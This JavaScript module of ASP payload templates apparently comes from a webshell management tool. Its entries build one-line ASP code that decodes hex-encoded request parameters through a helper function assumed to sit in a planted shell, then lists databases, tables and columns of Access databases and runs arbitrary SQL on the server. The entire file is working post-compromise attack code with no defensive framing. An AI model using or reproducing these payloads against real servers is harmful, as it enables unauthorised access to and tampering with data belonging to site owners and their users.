/**
 * ASP::access数据库驱动代码模板
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _:
      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open bd(Request("${arg1}")):If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI=Request("${arg2}")&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
    [arg1]: '#{hex::conn}',
    [arg2]: '#{dbname}'
  },
  // 显示数据库所有表
  show_tables: {
    _:
      `Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("${arg1}"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=Conn.OpenSchema(20):Rs.MoveFirst:SI="":Do While Not Rs.Eof:If Rs("TABLE_TYPE")="TABLE" Then:SI=SI&Rs("TABLE_NAME")&chr(9):End If:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
    [arg1]: '#{hex::conn}',
  },
  // 显示表字段
  show_columns: {
    _:
      `Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:Set Conn=Server.CreateObject("Adodb.connection"):Dim SI:Conn.Open ""&bd(Request("${arg1}"))&"":If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:Set Rs=CreateObject("Adodb.Recordset"):Rs.open ""&bd(Request("${arg2}"))&"",Conn,1,1:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&" ("&TN(Rs.Fields.Item(n).Type)&")"&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,
    [arg1]: '#{hex::conn}',
    [arg2]: '#{hex::table}'
  },
  // 执行SQL语句
  query: {
    _:
      `Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open ""&bd(Request("${arg1}"))&"":Dim CO,HD,RN:CO=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):HD="Result"&CO&RN:If Err Then:Response.Write HD&Err.Description&CO&RN:Err.Clear:Else:Set Rs=Conn.Execute(""&bd(Request("${arg2}"))&""):If Err Then:Response.Write HD&Err.Number&":"&Err.Description&CO&RN:Err.Clear:Else:Dim FN:FN=Rs.Fields.Count-1:For n=0 To FN:Response.Write Rs.Fields.Item(n).Name&CO:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n):Response.Write CO:Next:Response.Write RN:Rs.MoveNext:Loop:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:`,
    [arg1]: '#{hex::conn}',
    [arg2]: '#{hex::sql}',
  }
})
